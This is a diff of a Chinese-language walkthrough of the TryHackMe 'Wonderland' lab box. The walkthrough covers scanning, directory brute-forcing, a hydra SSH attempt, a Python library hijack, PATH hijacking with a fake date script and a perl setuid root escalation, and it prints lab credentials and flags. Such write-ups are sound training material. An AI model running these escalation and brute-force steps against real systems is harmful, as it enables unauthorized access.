@@ -1,7 +1,7 @@
-#服务发现
+# 服务发现
 ```
 ┌──(root💀kali)-[~]
-└─# nmap -sV -Pn 10.10.86.51
+└─#  nmap -sV -Pn 10.10.86.51
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 02:41 EDT
 Nmap scan report for 10.10.132.163
@@ -17,10 +17,10 @@ Nmap done: 1 IP address (1 host up) scanned in 80.63 seconds
 ```
 
 
-#目录爆破
+# 目录爆破
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -u "http://10.10.132.163" -e* -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt  -t 100
+└─#  python3 dirsearch.py -u "http://10.10.132.163" -e* -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt  -t 100
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -49,14 +49,14 @@ Target: http://10.10.132.163
 ```
 
 
-#http://10.10.132.163/r是一行文字
+# http://10.10.132.163/r是一行文字
 ```
 Keep Going.
 
 "Would you tell me, please, which way I ought to go from here?"
 ```
 
-#http://10.10.132.163/poem 是一首英文诗
+# http://10.10.132.163/poem 是一首英文诗
 ```
 The Jabberwocky
 
@@ -97,48 +97,48 @@ And the mome raths outgrabe.
 ```
 
 
-#给出来的hint是：Everything is upside down here. 发现img/下有三张图片，alice_door有一行英文，无论倒过来还是正面看都看不出来写的是什么
+# 给出来的hint是：Everything is upside down here. 发现img/下有三张图片，alice_door有一行英文，无论倒过来还是正面看都看不出来写的是什么
 ```
 alice_door.jpg
 alice_door.png
 white_rabbit_1.jpg
 ```
 
-#谷歌搜索可能是插画作者的落款，插画作者名字叫John Tenniel   
+# 谷歌搜索可能是插画作者的落款，插画作者名字叫John Tenniel   
 
 
-#尝试以alice为用户名爆破ssh，连接被reset了，看来不让爆ssh
+# 尝试以alice为用户名爆破ssh，连接被reset了，看来不让爆ssh
 hydra -l alice -P /usr/share/wordlists/rockyou.txt 10.10.86.51ssh  -v 
 
-#爆破目录r/,得到http://10.10.132.163/r/a
+# 爆破目录r/,得到http://10.10.132.163/r/a
 ```
 Keep Going.
 
 "That depends a good deal on where you want to get to," said the Cat.
 ```
 
-#重复爆破,得到http://10.10.132.163/r/a/b
+# 重复爆破,得到http://10.10.132.163/r/a/b
 ```
 Keep Going.
 
 "I don’t much care where—" said Alice.
 ```
 
-#http://10.10.132.163/r/a/b/b
+# http://10.10.132.163/r/a/b/b
 ```
 Keep Going.
 
 "Then it doesn’t matter which way you go," said the Cat.
 ```
 
-#http://10.10.132.163/r/a/b/b/i/
+# http://10.10.132.163/r/a/b/b/i/
 ```
 Keep Going.
 
 "—so long as I get somewhere,"" Alice added as an explanation.
 ```
 
-#http://10.10.132.163/r/a/b/b/i/t/
+# http://10.10.132.163/r/a/b/b/i/t/
 ```
 Open the door and enter wonderland
 
@@ -149,16 +149,16 @@ Alice felt that this could not be denied, so she tried another question. "What s
 "In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving the other paw, "lives a March Hare. Visit either you like: they’re both mad."
 ```
 
-#在上面页面查看网页源代码发现一个类似登录凭证的东西
+# 在上面页面查看网页源代码发现一个类似登录凭证的东西
 ```
 alice:HowDothTheLittleCrocodileImproveHisShiningTail
 ```
 
 
-#成功登录alice的ssh账号
+# 成功登录alice的ssh账号
 ```
 ┌──(root💀kali)-[~]
-└─# ssh alice@10.10.86.51                                                                                                                                                                                                           130 ⨯
+└─#  ssh alice@10.10.86.51                                                                                                                                                                                                           130 ⨯
 alice@10.10.132.163's password: 
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
 
@@ -199,21 +199,21 @@ drwxrwxr-x 3 alice alice 4.0K May 25  2020 .local
 alice@wonderland:~$ 
 ```
 
-#发现有root flag，但是当然没有读权限，同目录还有一个python脚本
+# 发现有root flag，但是当然没有读权限，同目录还有一个python脚本
 
 
-#全局查找user.txt失败
+# 全局查找user.txt失败
 
-#查看home目录和/etc/passwd文件，除了alice以外，还有hatter  rabbit  tryhackme三个用户，但是alice用户都没有进入这三个用户主目录的权限，看来是需要横向提权？
+# 查看home目录和/etc/passwd文件，除了alice以外，还有hatter  rabbit  tryhackme三个用户，但是alice用户都没有进入这三个用户主目录的权限，看来是需要横向提权？
 
-#查找所有包含hatter  rabbit  tryhackme字样的文件，没啥发现
+# 查找所有包含hatter  rabbit  tryhackme字样的文件，没啥发现
 ```
 find / |xargs grep -ri 'hatter' -l >hatter.txt 
 find / |xargs grep -ri 'rabbit' -l >rabbit.txt  
 find / |xargs grep -ri 'tryhackme' -l >tryhackme.txt
 ```
 
-#上传linpease，枚举提权漏洞，发现可以利用perl提升到root权限
+# 上传linpease，枚举提权漏洞，发现可以利用perl提升到root权限
 ```
 Files with capabilities (limited to 50):
 /usr/bin/perl5.26.1 = cap_setuid+ep
@@ -221,19 +221,19 @@ Files with capabilities (limited to 50):
 /usr/bin/perl = cap_setuid+ep
 ```
 
-#但是alice本身没有执行/usr/bin/perl的权限，而用户hatter可以，也就是我们需要先提权到hatter
+# 但是alice本身没有执行/usr/bin/perl的权限，而用户hatter可以，也就是我们需要先提权到hatter
 ```
 alice@wonderland:/etc/ldap$ ll /usr/bin/perl
 -rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl*
 ```
 
-#user flag的提示是Everything is upside down here.因为root.txt在/home/alice/root.txt，所以user.txt就是在/root/user.txt ，，这其实是一道理解题。。。
+# user flag的提示是Everything is upside down here.因为root.txt在/home/alice/root.txt，所以user.txt就是在/root/user.txt ，，这其实是一道理解题。。。
 ```
 alice@wonderland:~$ cat /root/user.txt
 thm{"Curiouser and curiouser!"}
 ```
 
-#用alice身份 sudo -l，发现walrus_and_the_carpenter.py跟rabbit是关联的
+# 用alice身份 sudo -l，发现walrus_and_the_carpenter.py跟rabbit是关联的
 ```
 alice@wonderland:~$ sudo -l
 [sudo] password for alice: 
@@ -245,7 +245,7 @@ User alice may run the following commands on wonderland:
 ```
 
 
-#walrus_and_the_carpenter.py源代码如下
+# walrus_and_the_carpenter.py源代码如下
 ```
 import random
 poem = """The sun was shining on the sea,
@@ -379,21 +379,21 @@ for i in range(10):
     print("The line was:\t", line)
 ```
 
-#分析源代码,看上去只是随机输出10行诗句，但是假如我们在同目录创建一个random.py,并且py的代码如下，那么我们执行时就可以拿到rabbit的shell。这实际上是利用了python的包含文件原理，如果同目录有同名文件，则优先包含同目录的，其次才去找库文件有没有同名文件
+# 分析源代码,看上去只是随机输出10行诗句，但是假如我们在同目录创建一个random.py,并且py的代码如下，那么我们执行时就可以拿到rabbit的shell。这实际上是利用了python的包含文件原理，如果同目录有同名文件，则优先包含同目录的，其次才去找库文件有没有同名文件
 ```
-#random.py
+# random.py
 import os
 os.system("/bin/bash")
 ```
 
-#执行
+# 执行
 ```
 alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 rabbit@wonderland:~$ whoami
 rabbit
 ```
 
-#现在我们拿到了rabbit的shell，在/home/rabbit目录，发现一个二进制文件teaParty，执行提示
+# 现在我们拿到了rabbit的shell，在/home/rabbit目录，发现一个二进制文件teaParty，执行提示
 ```
 rabbit@wonderland:/home/rabbit$ ./teaParty 
 Welcome to the tea party!
@@ -405,10 +405,10 @@ Segmentation fault (core dumped)
 
 ```
 
-#我们把teaParty这个二进制文件传回kali攻击机，用strings命令查看（strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束）
+# 我们把teaParty这个二进制文件传回kali攻击机，用strings命令查看（strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束）
 ```
 ┌──(root💀kali)-[~/tryhackme/wonderland]
-└─# strings teaParty
+└─#  strings teaParty
 /lib64/ld-linux-x86-64.so.2
 2U~4
 libc.so.6
@@ -435,18 +435,18 @@ GCC: (Debian 8.3.0-6) 8.3.0
 
 ```
 
-#分析下面这行代码
+# 分析下面这行代码
 ```/bin/echo -n 'Probably by ' && date --date='next hour' -R```
 首先执行/bin/echo -n 'Probably by '，然后再执行date --date='next hour' -R，date这个命令没有指明路径，像上面的python文件一样，如果当前目录有这个文件，那就会执行这个文件，没有这个文件系统就会去$PATH查找是否有这个命令
 
 
-#查看当前$PATH
+# 查看当前$PATH
 ```
 rabbit@wonderland:/home/rabbit$ echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
 ```
 
-#把tmp目录加进$PATH里
+# 把tmp目录加进$PATH里
 ```
 rabbit@wonderland:/home/rabbit$ export PATH=/tmp:$PATH
 rabbit@wonderland:/home/rabbit$ echo $PATH
@@ -454,13 +454,13 @@ rabbit@wonderland:/home/rabbit$ echo $PATH
 
 ```
 
-#在/tmp下创建一个date文件，编写以下代码，并且chmod +x /tmp/date
+# 在/tmp下创建一个date文件，编写以下代码，并且chmod +x /tmp/date
 ```
-#!/bin/bash
+# !/bin/bash
 /bin/bash
 ```
 
-#再次执行，获得hatter的shell
+# 再次执行，获得hatter的shell
 ```
 rabbit@wonderland:/home/rabbit$ vim /tmp/date
 rabbit@wonderland:/home/rabbit$ chmod +x /tmp/date 
@@ -473,21 +473,21 @@ hatter@wonderland:/home/rabbit$ id
 uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
 ```
 
-#在hatter目录拿到ssh密码
+# 在hatter目录拿到ssh密码
 ```
 hatter@wonderland:/home/rabbit$ cat /home/hatter/password.txt
 WhyIsARavenLikeAWritingDesk?
 
 ```
 
-#用ssh登录hatter账号拿到hatter的full shell，根据之前linpease枚举的结果利用perl提升到root权限（参考https://gtfobins.github.io/gtfobins/perl/）
+# 用ssh登录hatter账号拿到hatter的full shell，根据之前linpease枚举的结果利用perl提升到root权限（参考https://gtfobins.github.io/gtfobins/perl/）
 ```
 hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
-# id
+#  id
 uid=0(root) gid=1003(hatter) groups=1003(hatter)
-# cat /home/alice/root.txt
+#  cat /home/alice/root.txt
 thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
 ```
 
-#总结
+# 总结
 非常精彩的靶机，走了不少弯路，学习了通过引用文件进行提权的方法。
